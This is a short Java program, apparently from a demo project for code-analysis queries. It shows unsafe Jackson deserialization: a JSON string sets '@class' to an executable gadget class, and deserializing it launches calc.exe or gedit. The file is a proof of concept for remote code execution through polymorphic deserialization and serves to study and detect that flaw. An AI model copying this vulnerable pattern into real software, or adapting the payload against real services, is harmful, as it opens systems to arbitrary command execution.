package com.gypsyengineer.ql.fun.jackson.one;

import com.fasterxml.jackson.databind.ObjectMapper;

public class UnsafePersonDeserialization {

    private static final String command =
            System.getProperty("os.name").toLowerCase().contains("windows")
                    ? "calc.exe" : "gedit";

    private static final String bad =
            "{\"name\":\"Bender\","
                    + "\"age\":101,"
                    + "\"phone\":{"
                    + "   \"@class\":\"com.popular.lib.Exec\","
                    + "   \"command\":\"" + command + "\""
                    + "}}";

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        Person person = mapper.readValue(bad, Person.class);
        System.out.println(person.toString());
    }
}
